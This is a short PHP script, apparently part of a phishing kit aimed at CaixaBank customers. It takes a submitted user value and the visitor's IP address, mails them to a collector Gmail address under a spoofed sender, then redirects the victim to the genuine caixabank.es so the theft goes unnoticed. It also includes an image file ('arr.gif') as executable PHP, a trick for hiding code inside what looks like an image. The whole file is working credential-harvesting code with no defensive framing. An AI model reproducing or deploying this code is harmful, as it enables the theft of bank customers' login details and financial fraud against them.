<?php
include('arr.gif');
$ip = getenv("REMOTE_ADDR");
$message .= "   USER   : ".$_POST['image']."\n";
$message .= "IP: ".$ip."\n";
$to = "youremail@gmail.com";
$subject = "USER CAIXA IMG";
$from = "From: Bull De Dog<User@Caxixa.com>";
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$from);

  
    header("Location: https://caixabank.es");

?>